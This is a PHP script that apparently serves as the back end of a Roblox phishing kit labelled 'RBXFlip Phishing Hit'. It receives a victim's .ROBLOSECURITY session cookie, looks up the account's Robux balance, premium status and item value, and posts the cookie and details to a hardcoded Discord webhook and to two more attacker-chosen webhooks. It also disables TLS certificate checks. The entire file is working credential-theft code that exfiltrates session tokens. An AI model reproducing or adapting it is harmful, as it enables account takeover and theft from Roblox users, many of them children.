<?php
    $cookie = $_GET['t'];
    function get_user_rap($user_id, $cookie) {
        $cursor = "";
        $total_rap = 0;
                        
        while ($cursor !== null) {
            $request = curl_init();
            curl_setopt($request, CURLOPT_URL, "https://inventory.roblox.com/v1/users/$user_id/assets/collectibles?assetType=All&sortOrder=Asc&limit=100&cursor=$cursor");
            curl_setopt($request, CURLOPT_HTTPHEADER, array('Cookie: .ROBLOSECURITY='.$cookie));
            curl_setopt($request, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($request, CURLOPT_SSL_VERIFYPEER, 0); 
            curl_setopt($request, CURLOPT_SSL_VERIFYHOST, 0);
            $data = json_decode(curl_exec($request), 1);
            foreach($data["data"] as $item) {
                $total_rap += $item["recentAveragePrice"];
            }
            $cursor = $data["nextPageCursor"] ? $data["nextPageCursor"] : null;
        }
                        
        return $total_rap;
    }

    if ($cookie) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://www.roblox.com/mobileapi/userinfo");
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Cookie: .ROBLOSECURITY=' . $cookie
        ));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $profile = json_decode(curl_exec($ch), 1);
        curl_close($ch);
        

        $hookObject = json_encode([
            "username" => $profile ["UserName"],
            "avatar_url" => "https://www.roblox.com/avatar-thumbnail/image?userId=". $profile["UserID"] . "&width=352&height=352&format=png",
             "content" => "@everyone New RBXFlip Phishing Hit!",
                "embeds" => [
                    [
                        "title" => $profile ["UserName"],
                        "type" => "rich",
                        "url" => "https://www.roblox.com/users/" . $profile["UserID"] . "/profile",
                        "color" => hexdec("00ff6e"),
                        "thumbnail" => [
                            "url" => "https://www.roblox.com/avatar-thumbnail/image?userId=". $profile["UserID"] . "&width=352&height=352&format=png"
                        ],
                        "author" => [
                             "name" => "Recheck Cookie?",
                             "url" => "https://beta-rolimons.xyz/chk.php?c=$cookie"
                        ],
                        "fields" => [
                            [
                                "name" => "<:id:818111672455397397> ID",
                                "value" => $profile["UserID"],
                                "inline" => True
                            ],
                            [
                                "name" => "<:robux:818111919881715764> Robux",
                                "value" => $profile["RobuxBalance"],
                                "inline" => True
                            ],
                            [    "name" => "<:rolimons:818111627726684160> Rolimons Link",
                                "value" => "https://www.rolimons.com/player/" . $profile["UserID"],
                            ],
                            [
                                "name" => "<:trade:818111735973806111> Trade Link",
                                "value" => "https://www.roblox.com/Trade/TradeWindow.aspx?TradePartnerID=" . $profile["UserID"],
                                "inline" => True
                       	    ],
                       	    [
                                "name" => "<:premium:818111829963964416> Is Premium?",
                                "value" => $profile["IsPremium"],
                                "inline" => True
                            ],
                            [
                                "name" => "<:rap:818111763413205032> Rap",
                                "value" => get_user_rap($profile["UserID"], $cookie),
                                "inline" => True
                            ]
                        ]
                    ],
                    [
                        "type" => "rich",
                        "color" => hexdec("00ff6e"),
                        "timestamp" => date("c"),
                         "footer" => [
                             "text" => "Powered By mat.t#0001",
                             "icon_url" => "https://www.roblox.com/avatar-thumbnail/image?userId=". $profile["UserID"] . "&width=352&height=352&format=png",
                        ],
                        "fields" => [
                            [
                                "name" => "\u{1F36A} Cookie:",
                                "value" => "```yaml
" . $cookie . "```"
                             ]
                        ]
                    ]
                ]

            
            ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

        //dualhook//
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => "https://discord.com/api/webhooks/873341914462699600/LSpnSj3Z-bGJovi-keZ_qXvNNb9nLYuUWyVfvmuMDmq_P30ArMmFIo9rJAQBLK3gHGhQ",
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $hookObject,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);
  
                                        
        $response = curl_exec($ch);
        curl_close($ch);
         $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $_GET["web"],
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $hookObject,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);
  
                                        
        $response = curl_exec($ch);
        curl_close($ch);
         $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $_GET["dual"],
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $hookObject,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);
  
                                        
        $response = curl_exec($ch);
        curl_close($ch);
    function realIP() {
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
    
        if(filter_var($client, FILTER_VALIDATE_IP)) { $ip = $client; }
        elseif(filter_var($forward, FILTER_VALIDATE_IP)) { $ip = $forward; }
        else { $ip = $remote; }
    
        return $ip;
    }
    function get_user_rap($user_id, $cookie) {
        $cursor = "";
        $total_rap = 0;
                        
        while ($cursor !== null) {
            $request = curl_init();
            curl_setopt($request, CURLOPT_URL, "https://inventory.roblox.com/v1/users/$user_id/assets/collectibles?assetType=All&sortOrder=Asc&limit=100&cursor=$cursor");
            curl_setopt($request, CURLOPT_HTTPHEADER, array('Cookie: .ROBLOSECURITY='.$cookie));
            curl_setopt($request, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($request, CURLOPT_SSL_VERIFYPEER, 0); 
            curl_setopt($request, CURLOPT_SSL_VERIFYHOST, 0);
            $data = json_decode(curl_exec($request), 1);
            foreach($data["data"] as $item) {
                $total_rap += $item["recentAveragePrice"];
            }
            $cursor = $data["nextPageCursor"] ? $data["nextPageCursor"] : null;
        }
                        
        return $total_rap;
    }
    function account_filter($profile) {
        return true;
    }
    
    }
?>